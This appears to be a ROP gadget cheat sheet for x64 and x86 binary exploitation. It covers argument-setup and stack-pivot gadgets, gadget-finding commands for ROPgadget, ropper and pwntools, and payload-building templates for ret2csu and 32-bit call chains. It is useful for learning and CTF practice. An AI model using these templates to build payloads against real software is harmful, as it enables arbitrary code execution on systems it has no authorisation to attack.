# ROP Gadget Reference

Common gadgets and their uses.

## Essential x64 Gadgets

### Argument Setup (System V AMD64 ABI)
```
Arg 1: RDI - pop rdi; ret
Arg 2: RSI - pop rsi; ret (or pop rsi; pop r15; ret)
Arg 3: RDX - pop rdx; ret
Arg 4: RCX - pop rcx; ret
Arg 5: R8  - pop r8; ret
Arg 6: R9  - pop r9; ret
```

### Stack Pivot
```
leave; ret          - mov rsp, rbp; pop rbp; ret
xchg rsp, rax; ret  - Swap RSP with RAX
pop rsp; ret        - Direct RSP control
```

### Memory Operations
```
mov [rdi], rax; ret       - Write RAX to [RDI]
mov rax, [rdi]; ret       - Read [RDI] into RAX
mov [rdi], rsi; ret       - Write RSI to [RDI]
add [rbp-0x3d], ebx; ret  - Add gadget (for GOT)
```

### Syscall
```
syscall; ret        - Make syscall
int 0x80; ret       - Legacy syscall (32-bit)
```

### Control Flow
```
ret                 - Stack alignment / slide
call rax; ret       - Call address in RAX
jmp rax             - Jump to RAX
```

## Finding Gadgets

### ROPgadget
```bash
# Basic search
ROPgadget --binary ./binary

# Filter by instruction
ROPgadget --binary ./binary | grep "pop rdi"

# Only specific types
ROPgadget --binary ./binary --only "pop|ret"

# Search in libc
ROPgadget --binary ./libc.so.6 | grep "pop rdi"
```

### ropper
```bash
# Interactive
ropper -f ./binary

# Search
ropper -f ./binary --search "pop rdi"

# Generate chain
ropper -f ./binary --chain execve
```

### pwntools
```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Find gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Auto-build chain
rop.call('puts', [elf.got['puts']])
rop.call('main')
print(rop.dump())
```

## ret2csu Gadgets

Universal gadgets in `__libc_csu_init` (most binaries):

### Gadget 1 (Setup)
```asm
pop rbx      ; 0
pop rbp      ; 1 (for comparison)
pop r12      ; Argument 3 (rdx)
pop r13      ; Argument 2 (rsi)
pop r14      ; Argument 1 (edi - lower 32 bits)
pop r15      ; Function pointer to call
ret
```

### Gadget 2 (Call)
```asm
mov rdx, r12
mov rsi, r13
mov edi, r14d
call [r15 + rbx*8]
; After call, checks rbx == rbp, if so continues
add rbx, 1
cmp rbp, rbx
jne <loop>
; Falls through to Gadget 1 (add rsp, 8; then pops)
```

### Usage Pattern
```python
# Set up arguments and call function pointer
csu_init = elf.symbols['__libc_csu_init']
gadget1 = csu_init + 0x5a  # Adjust offset
gadget2 = csu_init + 0x40  # Adjust offset

payload = b'A' * offset
payload += p64(gadget1)
payload += p64(0)          # rbx = 0
payload += p64(1)          # rbp = 1 (rbx + 1)
payload += p64(arg3)       # r12 -> rdx
payload += p64(arg2)       # r13 -> rsi
payload += p64(arg1)       # r14 -> edi
payload += p64(func_ptr)   # r15 -> call target (GOT entry)
payload += p64(gadget2)    # Call function
# Need 7 more qwords for the post-call pops
payload += p64(0) * 7
payload += p64(next_rop)   # Continue chain
```

## x86 (32-bit) Gadgets

Arguments on stack, simpler ROP:

```python
# Call function(arg1, arg2)
payload = p32(function)
payload += p32(return_after)  # Return address
payload += p32(arg1)
payload += p32(arg2)
```

### Common x86 Gadgets
```
pop eax; ret
pop ebx; ret
pop ecx; pop ebx; ret
int 0x80; ret
```

## Gadget Chains

### Write-What-Where
```
pop rdi; ret         ; Address to write
pop rsi; ret         ; Value to write
mov [rdi], rsi; ret  ; Perform write
```

### Add to GOT (bypassing seccomp)
```
pop rbp; ret         ; GOT entry + 0x3d
pop rbx; ret         ; Value to add
add [rbp-0x3d], ebx; ret
```

## Tips

1. Check both binary AND libc for gadgets
2. Sometimes need to use "imperfect" gadgets (extra pops)
3. `ret` gadget useful for stack alignment
4. Look for `ret2csu` if missing common gadgets
5. On 32-bit, arguments are easier (just stack)
